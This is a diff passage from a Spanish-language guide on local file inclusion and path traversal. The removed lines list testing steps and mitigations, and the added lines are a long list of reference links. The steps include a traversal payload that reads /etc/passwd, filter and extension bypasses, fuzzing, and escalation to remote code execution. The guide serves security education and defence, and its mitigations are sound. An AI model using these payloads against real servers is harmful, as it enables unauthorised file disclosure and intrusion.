-1. **Identificar Puntos de Entrada:** Busca parámetros que parezcan indicar nombres de archivo, rutas, plantillas, identificadores de recursos (e.g., `file=`, `page=`, `document=`, `template=`, `include=`, `path=`, `style=`, `item=`).
-2. **Prueba de Traversal Básico:**
-   - Intenta leer `/etc/passwd` o `C:\Windows\win.ini` usando secuencias `../` o `..\`.
-   - `?file=../../../../etc/passwd`
-3. **Analizar Errores:** Los mensajes de error pueden revelar la ruta completa en el servidor, ayudando a calcular cuántos `../` se necesitan.
-4. **Probar Bypasses de Filtros de `../`:**
-   - Codificaciones (URL, doble URL, no estándar).
-   - Secuencias como `....//`.
-5. **Probar Bypasses de Sufijos de Extensión:**
-   - Null byte (`%00`).
-   - Query string (`?`).
-   - Fragmento (`#`).
-6. **Usar Listas de Fuzzing:** Herramientas como Burp Intruder o `ffuf` con listas de payloads de LFI (e.g., de SecLists) para probar muchas variaciones automáticamente.
-7. **Intentar Escalada a RCE:** Si se confirma LFI en un servidor PHP, probar los vectores de RCE (wrappers, log poisoning, etc.).
-
-### Mitigaciones Clave
-
-1. **Validación Estricta de Entradas (Whitelist):**
-   - La mejor defensa. En lugar de intentar sanitizar rutas, mantener una lista blanca de archivos o patrones de archivos permitidos y solo permitir esos.
-   - Ej: Si `page=inicio`, la aplicación carga `templates/inicio.html`. El input del usuario nunca es parte de una ruta de archivo.
-2. **Sanitización y Normalización de Rutas:**
-   - Si se debe usar input del usuario en rutas, normalizar la ruta (resolver `../`, `./`) y luego verificar que la ruta resultante siga estando dentro del directorio base esperado (chroot jail o validación estricta del path canónico).
-   - Eliminar o rechazar secuencias `../` y `..\` después de la normalización.
-3. **Principio de Mínimos Privilegios:**
-   - Ejecutar el proceso del servidor web con los permisos más bajos posibles. El usuario del servidor web no debería tener permiso para leer archivos sensibles fuera de su directorio raíz.
-4. **Deshabilitar Carga de Módulos PHP Peligrosos:**
-   - Si no se usan, deshabilitar wrappers como `expect://` o funciones que puedan facilitar RCE.
-5. **Configuración Segura del Servidor:**
-   - No permitir listado de directorios.
-   - Configurar logs para que no sean fácilmente envenenables o accesibles vía LFI.
-6. **Manejo de Errores Genérico:** No revelar rutas completas o información sensible en los mensajes de error.
+[^1]: https://virtualcyberlabs.com/local-file-inclusion-lfi/
+    
+[^2]: https://atlansec.es/blog/posts/06-04-2025/
+    
+[^3]: https://www.invicti.com/learn/local-file-inclusion-lfi/
+    
+[^4]: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion
+    
+[^5]: https://www.offsec.com/metasploit-unleashed/file-inclusion-vulnerabilities/
+    
+[^6]: https://www.hackplayers.com/2018/12/race-condition-phpinfo-mas-lfi-rce.html
+    
+[^7]: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition
+    
+[^8]: https://www.fastly.com/blog/back-to-basics-directory-traversal
+    
+[^9]: https://www.invicti.com/learn/directory-traversal-path-traversal/
+    
+[^10]: https://www.invicti.com/blog/web-security/php-stream-wrappers/
+    
+[^11]: https://infosecwriteups.com/rce-via-lfi-oscp-tactics-for-code-execution-and-gaining-a-foothold-on-a-system-b35d0655f3c7
+    
+[^12]: https://nsfocusglobal.com/path-traversal-attack-protection/
+    
+[^13]: https://www.slideshare.net/slideshow/waf-bypassing-techniques/64302972
+    
+[^14]: https://bugbase.ai/blog/top-10-ways-to-bypass-waf
+    
+[^15]: https://bogner.sh/2018/04/race-to-rce-there-is-more-on-the-web-than-just-xss/
+    
+[^16]: https://github.com/topics/lfi-detection?o=asc\&s=updated
+    
+[^17]: https://www.acunetix.com/vulnerability-scanner/lfi-vulnerability-scanner/
+    
+[^18]: https://stackoverflow.com/questions/64088681/how-to-test-and-exploit-lfi-vulnerabilities
+    
+[^19]: https://www.brightsec.com/blog/lfi-attack-real-life-attacks-and-attack-examples/
+    
+[^20]: https://www.avertium.com/flash-notices/wordpress-review-plugin-local-file-inclusion
+    
+[^21]: https://support.polarisec.com/en/docs/general-knowledge/lfi-and-rfi-attacks/
+    
+[^22]: https://github.com/advisories/GHSA-qq86-38fr-rcf3
+    
+[^23]: https://nvd.nist.gov/vuln/detail/CVE-2025-49138
+    
+[^24]: https://github.com/advisories/GHSA-p75g-cxfj-7wrx
+    
+[^25]: https://www.cvedetails.com/cve/CVE-2025-51057/
+    
+[^26]: https://owasp.org/www-community/attacks/Path_Traversal
+    
+[^27]: https://www.exploit-db.com/exploits/52125
+    
+[^28]: https://portswigger.net/web-security/file-path-traversal
+    
+[^29]: https://www.riskinsight-wavestone.com/en/2022/09/barbhack-2022-leveraging-php-local-file-inclusion-to-achieve-universal-rce/
+    
+[^30]: https://nvd.nist.gov/vuln/detail/CVE-2025-26905
+    
+[^31]: https://techbrunch.github.io/patt-mkdocs/Directory Traversal/
+    
+[^32]: https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2/
+    
+[^33]: https://www.cve.org/cverecord?id=CVE-2025-0632
+    
+[^34]: https://www.aikido.dev/blog/path-traversal-in-2024-the-year-unpacked
+    
+[^35]: https://patchstack.com/articles/critical-lfi-to-rce-vulnerability-in-wp-ghost-plugin-affecting-200k-sites/
+    
+[^36]: https://wpscan.com/vulnerability/7570bd32-f660-44e7-abc6-5d4ea369fe30/
+    
+[^37]: https://advisories.checkpoint.com/defense/advisories/public/2024/cpai-2024-0395.html/
+    
+[^38]: https://deephacking.tech/php-wrappers-pentesting-web/
+    
+[^39]: https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion
+    
+[^40]: https://brightsec.com/blog/local-file-inclusion-lfi/
+    
+[^41]: https://4geeks.com/lesson/local-file-inclusion-remote-file-inclusion
+    
+[^42]: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass
+    
+[^43]: https://github.com/topics/lfi-scanner
+    
+[^44]: https://www.yeswehack.com/learn-bug-bounty/practical-guide-path-traversal-attacks
+    
+[^45]: https://medium.verylazytech.com/enhancing-your-understanding-of-local-file-inclusion-lfi-35a26f9efadd
+    
+[^46]: https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki
+    
+[^47]: https://fluidattacks.com/es/advisories/silva
+    
+[^48]: https://hackmd.io/@Solderet/list/%2FgZFHwwuQQo6ya_Q6ULYrdA
+    
+[^49]: https://www.scribd.com/document/857621425/Advanced-LFI-Bypass-Techniques
+    
+[^50]: https://gynvael.coldwind.pl/?id=418
+    
+[^51]: https://waf-bypass.com/2025/03/page/2/
+    
+[^52]: https://help.fortinet.com/fweb/605/Content/FortiWeb/fortiweb-admin/web_protection.htm
+    
+[^53]: https://www.youtube.com/watch?v=5g137gsB9Wk
+    
+[^54]: https://infosecwriteups.com/️-how-to-bypass-web-application-firewalls-wafs-8346e6e79dd3
+    
+[^55]: https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/783
+    
+[^56]: https://waf-bypass.com/2025/05/
